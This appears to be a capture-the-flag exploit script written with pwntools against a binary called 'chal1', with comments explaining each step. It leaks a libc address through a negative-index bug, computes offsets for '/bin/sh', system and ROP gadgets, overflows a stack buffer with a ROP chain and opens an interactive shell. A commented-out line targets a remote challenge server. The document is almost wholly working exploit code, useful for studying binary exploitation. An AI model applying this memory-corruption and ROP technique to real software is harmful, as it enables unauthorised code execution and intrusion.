from pwn import *

gdbscript = "b main\nb *main+261\nc"

with gdb.debug("./chal1", gdbscript=gdbscript) as conn:
#with remote("54.193.31.133", 13000) as conn:
    # Input any name
    print(conn.recvline())
    conn.sendline(b"asdf")

    # Program uses signed arithmetic to compute src pointer, so we can
    # input a negative index. The address (name - 32) has a glibc
    # address (address to stderr object, but that doesn't matter).
    print(conn.recvline())
    conn.sendline(b"-32")

    # Memory addresses on x86-64 are 8 bytes long
    print(conn.recvline())
    conn.sendline(b"8")

    # The resulting substring is actually a sequence of raw bytes that
    # is the 8-byte representation of the leaked address. We use GDB
    # with GEF to compute the offset from the leaked address to the
    # base address (first address) of libc.
    print(conn.recvline())
    line = conn.recvline(keepends=False)
    libc_leak_addr = int.from_bytes(line, "little")
    libc_base_addr = libc_leak_addr - 2209440
    print(f"libc_base_addr {hex(libc_base_addr)}")

    print(conn.recvline())
    # We use the `grep "/bin/sh\\x00` command in GDB with GEF to search
    # for an address in libc that has a null-terminated "/bin/sh" string.
    binsh_addr = libc_base_addr + 1934968
    # The set rdi ROP gadget is found using the ROPgadget tool.
    # `ROPgadget --binary libc.so.6 --ropchain --nojop`
    set_rdi_gadget_addr = libc_base_addr + 0x2a3e5
    # The offset of the system function in libc is also found using
    # GDB.
    system_addr = libc_base_addr + 331120
    # A simple ret gadget that just has one ret instruction is
    # necessary for 16-byte alignment of the stack when calling system.
    # In the Linux x86-64 ABI, rsp needs to be a multiple of 16 before
    # a call instruction, so after a call, rsp should be offset by 8
    # (rsp mod 16 = 8). Therefore, rsp needs to be offset by 8 when we
    # jump to system.
    ret_gadget_addr = libc_base_addr + 0x29cd6

    # The ROP chain payload

    # Buffer is at rbp-0x90, so fill 0x90 bytes
    # Return address is at rbp+0x8 since location at rbp is the
    # saved previous value of rbp, so fill another 8 bytes
    payload = b"h" * 0x90 + b"h" * 8
    payload += p64(set_rdi_gadget_addr)
    payload += p64(binsh_addr)
    payload += p64(ret_gadget_addr)
    payload += p64(system_addr)
    conn.sendline(payload)

    print(conn.recvline())

    # Now we have a shell :)
    conn.interactive()
